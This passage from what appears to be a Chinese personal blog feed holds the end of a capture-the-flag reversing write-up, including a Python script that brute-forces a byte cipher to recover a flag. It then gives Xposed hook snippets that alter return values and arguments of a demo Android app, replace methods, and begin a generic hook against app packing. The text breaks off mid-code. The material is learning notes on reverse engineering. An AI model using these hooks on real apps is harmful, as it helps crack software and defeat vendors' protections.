number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#load_data = [0xA7, 0x51, 0x68, 0x52, 0x85, 0x27, 0xFF, 0x31, 0x88, 0x87, 0xD2, 0xC7, 0xD3, 0x23, 0x3F, 0x52, 0x55, 0x10, 0x1F, 0xAF, 0x27, 0xF0, 0x94, 0x5C, 0xCD, 0x3F, 0x7A, 0x79, 0x9F, 0x2F, 0xF0, 0xE7, 0x45, 0xF0, 0x86, 0x3C, 0xF9, 0xB0, 0xEA, 0x6D, 0x90, 0x42, 0xF7, 0x91, 0xED, 0x3A, 0x9A, 0x7C, 0x01, 0x6B, 0x84, 0xDC, 0x6C, 0xC8, 0x43, 0x07, 0x5C, 0x08, 0xF7, 0xDF, 0xEB, 0xE3, 0xAE, 0xA4]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>crypto_table <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>s0_255<span class=\"token punctuation\">,</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">#get order table</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>source <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;'</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>replaced <span class=\"token operator\">=</span> <span class=\"token string\">'HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m'</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>revsere_table <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#index 是 source 在 replace 中的下标</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    revsere_table<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>replaced<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>cmp_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x526851A7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31FF2785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D28788</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x523F23D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF1F1055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C94F027</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x797A3FCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7F02F9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C86F045</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DEAB0F9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91F74290</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C9A3AED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC846B01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0743C86C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDFF7085C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4AEE3EB</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> cmp_data<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    tmp<span class=\"token operator\">+=</span>de_cmp<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    tmp <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> crypto_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    tmp <span class=\"token operator\">=</span> reverse_order<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> revsere_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>其中 python 和 C 语言的位运算有所不同 (对于符号位的处理) 所以需要使用 np 库</p>\n<p>运行即可得到 flag</p>\n<p>flag 是一个音乐网址 也算是一个小彩蛋吧</p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>有关加密算法由于太菜了不会逆 采用的是暴力的做法 相当于是 00-ff 的一个表 感觉以后遇到复杂的运算但又是按位加密的都可以这样做？</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/09/08/Xposed%E5%AD%A6%E4%B9%A0/",
            "url": "https://3cly.github.io/2023/09/08/Xposed%E5%AD%A6%E4%B9%A0/",
            "title": "Xposed学习",
            "date_published": "2023-09-08T07:41:12.000Z",
            "content_html": "<h1 id=\"xposed\"><a class=\"markdownIt-Anchor\" href=\"#xposed\">#</a> Xposed</h1>\n<p><img data-src=\"/images/image-20230905204011814.png\" alt=\"image-20230905204011814\"></p>\n<p><img data-src=\"/images/image-20230905204153283.png\" alt=\"image-20230905204153283\"></p>\n<p>方法名复制为 xposed 的片段</p>\n<p><img data-src=\"/images/image-20230905214904274.png\" alt=\"image-20230905214904274\"></p>\n<h3 id=\"1hook普通方法\"><a class=\"markdownIt-Anchor\" href=\"#1hook普通方法\">#</a> 1.Hook 普通方法</h3>\n<p>修改返回值</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        param<span class=\"token punctuation\">.</span><span class=\"token function\">setResult</span><span class=\"token punctuation\">(</span><span class=\"token number\">999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>修改参数</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com.zj.wuaipojie.Demo\"</span><span class=\"token punctuation\">,</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">String</span> a <span class=\"token operator\">=</span> <span class=\"token string\">\"pt\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        param<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><img data-src=\"/images/image-20230906202808776.png\" alt=\"image-20230906202808776\"></p>\n<h3 id=\"2hook复杂自定义参数\"><a class=\"markdownIt-Anchor\" href=\"#2hook复杂自定义参数\">#</a> 2.Hook 复杂 &amp; 自定义参数</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> a <span class=\"token operator\">=</span> loadPackageParam<span class=\"token punctuation\">.</span>classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"类名\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">hookAllMethods</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token string\">\"方法名\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">beforeHookedMethod</span><span class=\"token punctuation\">(</span>param<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 可以免填参数</span></pre></td></tr></table></figure><h3 id=\"3hook替换函数\"><a class=\"markdownIt-Anchor\" href=\"#3hook替换函数\">#</a> 3.Hook 替换函数</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span> a <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">loadClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"类名\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">XposedBridge</span><span class=\"token punctuation\">.</span><span class=\"token function\">hookAllMethods</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span><span class=\"token string\">\"方法名\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodReplacement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">replaceHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> methodHookParam<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"4hook加固通杀\"><a class=\"markdownIt-Anchor\" href=\"#4hook加固通杀\">#</a> 4.Hook 加固通杀</h3>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>复制代码 隐藏代码<span class=\"token class-name\">XposedHelpers</span><span class=\"token punctuation\">.</span><span class=\"token function\">findAndHookMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Application</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"attach\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Context</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XC_MethodHook</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">protected</span> <span class=\"token keyword\">void</span> <span class=\"token function\">afterHookedMethod</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">MethodHookParam</span> param<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Throwable</span> <span class=\"token punctuation\">&#123;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Context</span> context <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span><span class=\"token punctuation\">)</span> param<span class=\"token punctuation\">.</span>args<span class=\"token 